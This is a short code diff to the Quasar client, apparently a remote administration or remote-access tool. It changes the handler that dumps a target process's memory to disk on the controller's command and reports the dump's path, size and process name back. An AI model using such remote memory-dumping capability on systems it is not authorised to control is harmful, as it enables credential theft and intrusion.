@@ -217,17 +217,19 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoProcessDump message)
         {
-            byte[] dump = DumpHelper.GetProcessDump(message.Pid);
-            if (dump.Length > 0)
+            string dump;
+            bool success;
+            Process proc = Process.GetProcessById(message.Pid);
+            (dump, success) = DumpHelper.GetProcessDump(message.Pid);
+            if (success)
             {
                 // Could add a zip here later (idk how big a dump will be)
-                byte[] sizeTest = new byte[1024 * 5110];
-                Array.Copy(dump, sizeTest, sizeTest.Length);
-                client.Send(new DoProcessDumpResponse { Memory = sizeTest });
+                FileInfo dumpInfo = new FileInfo(dump);
+                client.Send(new DoProcessDumpResponse { Result = success, DumpPath = dump, Length = dumpInfo.Length, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = "", UnixTime = DateTime.Now.Ticks });
             }
             else
             {
-                client.Send(new DoProcessDumpResponse { Memory = new byte[] { } });
+                client.Send(new DoProcessDumpResponse { Result = success, DumpPath = "", Length = 0, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = dump, UnixTime = DateTime.Now.Ticks });
             }
         }
 
